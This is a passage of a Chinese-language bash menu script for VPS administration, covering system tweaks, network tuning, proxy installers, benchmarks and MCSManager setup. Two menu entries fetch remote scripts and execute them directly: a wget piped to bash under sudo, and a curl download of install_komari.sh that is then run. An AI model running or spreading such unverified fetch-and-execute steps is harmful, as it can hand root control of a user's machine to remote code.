                case $mcsmanager_choice in
                    1)
                        sudo su -c "wget -qO- https://script.mcsmanager.com/setup_cn.sh | bash"
                        ;;
                    2)
                        cd /opt/
                        wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz
                        tar -xvf node-v20.11.0-linux-x64.tar.xz
                        ln -s /opt/node-v20.11.0-linux-x64/bin/node /usr/bin/node
                        ln -s /opt/node-v20.11.0-linux-x64/bin/npm /usr/bin/npm
                        mkdir /opt/mcsmanager/
                        cd /opt/mcsmanager/
                        wget https://github.com/MCSManager/MCSManager/releases/latest/download/mcsmanager_linux_release.tar.gz
                        tar -zxf mcsmanager_linux_release.tar.gz
                        ./install.sh
                        echo -e "\033[32m请打开两个终端或screen来运行以下命令：\033[0m"
                        echo "./start-daemon.sh"
                        echo "./start-web.sh"
                        echo "访问地址：http://localhost:23333/"
                        ;;
                    *)
                        echo "无效的选择，请重试。"
                        ;;
                esac
                ;;
            11)
                curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/install_komari.sh && chmod +x install_komari.sh && ./install_komari.sh
                ;;
            12)
                break
                ;;
            *)
                echo "无效的选择，请重试。"
                ;;
        esac
        echo "脚本运行完成。按回车键返回菜单。"
        read -r
    done
}

while true; do
    clear
    show_menu
    read -p "请输入你的选择: " choice
    case $choice in
        1) 
            while true; do
                clear
                quick_actions_menu
                read -p "请输入你的选择: " quick_choice
                case $quick_choice in
                    1) batch_delete_files ;;
                    2) batch_rename_move_files ;;
                    3) batch_kill_processes ;;
                    4) system_reboot ;;
                    5) show_kernel_version ;;
                    6) quick_manage_icmp ;;
                    7) system_update ;;
                    8) dns_management ;;
                    9) file_lock_management ;;
                    10) timezone_management ;;
                    11) file_search_and_process ;;
                    12) cleanup_unused_packages ;;
                    13) break ;;
                    *) echo "无效的选择，请重试。" ;;
                esac
            done
            ;;
        2) 
            while true; do
                clear
                network_menu
                read -p "请输入你的选择: " net_choice
                case $net_choice in
                    1) kernel_optimization ;;
                    2) install_and_test_nexttrace ;;
                    3) install_ddns_script ;;
                    4) chicken_king_script ;;
                    5) enable_bbr ;;
                    6) install_multifunction_bbr ;;
                    7) tcp_window_tuning ;;
                    8) test_access_priority ;;
                    9) port_25_test ;;
                    10) adjust_ipv_priority ;;
                    11) manage_icmp ;;
                    12) install_warp_script ;;
                    13) manage_vnstat ;;
                    14) manage_iftop ;;
		    15) install_and_remove_old_kernel ;;
		    16) clear_kernel_optimizations ;;
		                  17) TCP_Optimization_Tool ;;
		                  18) break ;;
		                  *) echo "无效的选择，请重试。" ;;
		              esac
            done
            ;;
        3) 
            while true; do
                clear
                proxy_menu
                read -p "请输入你的选择: " proxy_choice
                case $proxy_choice in
                    1) xray_management ;;
                    2) install_mieru_script ;;
                    3) install_v2bx_script ;;
                    4) install_v2ray-agent_script ;;
                    5) install_xboard ;;
                    6) install_Aurora_script ;;
                    7) install_xiandan_script ;;
                    8) install_hy2_script ;;
                    9) install_dns_unlock_script ;;
                    10) port_scan_and_management ;;
		    11) install_ss_plugins ;;
      12) 233boy_xray ;;
      13)realm_gost_Forward ;;
      14) forward_panel ;;
                    15) break ;;
                    *) echo "无效的选择，请重试。" ;;
                esac
            done
            ;;
        4) 
            while true; do
                clear
                vps_test_menu
                read -p "请输入你的选择: " vps_choice
                case $vps_choice in
                    1) comprehensive_test_script ;;
                    2) performance_test_script ;;
                    3) media_ip_quality_test_script ;;
                    4) network_test_submenu ;;
                    5) break ;;
                    *) echo "无效的选择，请重试。" ;;
                esac
            done
            ;;
        5) function_script ;;
        6) install_common_env_software ;;
        7) echo "退出"; exit 0 ;;
        *) echo "无效的选择，请重试。"; read -r ;;
    esac
done
